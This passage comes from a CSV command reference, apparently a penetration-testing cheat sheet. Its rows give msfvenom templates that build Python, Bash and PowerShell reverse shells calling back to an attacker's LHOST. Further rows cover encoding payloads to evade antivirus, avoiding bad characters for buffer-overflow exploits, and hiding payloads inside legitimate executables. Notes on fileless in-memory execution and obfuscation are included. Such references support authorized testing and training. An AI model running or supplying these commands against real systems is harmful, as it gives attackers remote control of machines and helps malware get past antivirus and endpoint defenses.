Default WAR name becomes URL path (/shell.war -> /shell/).","high"
"msfvenom-python-reverse","Generate Python Reverse Shell Script","exploitation","msfvenom -p python/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py","Create Python script with reverse shell payload","metasploit","Python scripts work cross-platform (Linux, Windows with Python installed).

Less suspicious than compiled binaries.

Can be executed without file write via:
echo '<CODE>' | python","medium"
"msfvenom-powershell-reverse","Generate PowerShell Reverse Shell","exploitation","msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1","Create PowerShell script with Meterpreter reverse shell","metasploit","PowerShell payloads fileless and memory-resident.

Execute without touching disk:
powershell -c <BASE64_PAYLOAD>.

Often caught by AV/EDR - use encoding/obfuscation.","high"
"msfvenom-bash-reverse","Generate Bash Reverse Shell Script","exploitation","msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh","Create Bash script with reverse shell payload","metasploit","Bash payloads work on most Linux/Unix systems.

Can be executed inline:
bash -c '<PAYLOAD>'.

No file write needed for command injection.","medium"
"msfvenom-encode","Encode Payload for AV Evasion","exploitation","msfvenom -p <PAYLOAD> <OPTIONS> -e x86/shikata_ga_nai -i 3 -f <FORMAT> -o encoded.exe","Encode payload multiple times to evade antivirus signature detection","metasploit","Encoding is less effective against modern AV/EDR (behavioral detection).

Use as one layer of obfuscation, not sole evasion technique.

Iterations above 5-10 provide diminishing returns.","medium"
"msfvenom-bad-chars","Generate Payload Avoiding Bad Characters","exploitation","msfvenom -p <PAYLOAD> <OPTIONS> -b '<BAD_CHARS>' -f <FORMAT>","Generate payload that avoids specified bad characters for buffer overflow exploitation","metasploit","Common bad chars:
\x00 (null), \x0a (newline), \x0d (carriage return).

Use -f python/c for easy integration into exploit code.

Verify payload manually before use.","high"
"msfvenom-custom-template","Inject Payload into Custom Template","exploitation","msfvenom -p <PAYLOAD> <OPTIONS> -x <TEMPLATE_EXE> -f exe -o output.exe","Inject payload into existing executable template to avoid detection","metasploit","Template injection helps blend payload into legitimate-looking executable.

Use -k to maintain template's original function.

Effectiveness limited against modern AV/EDR.","low"
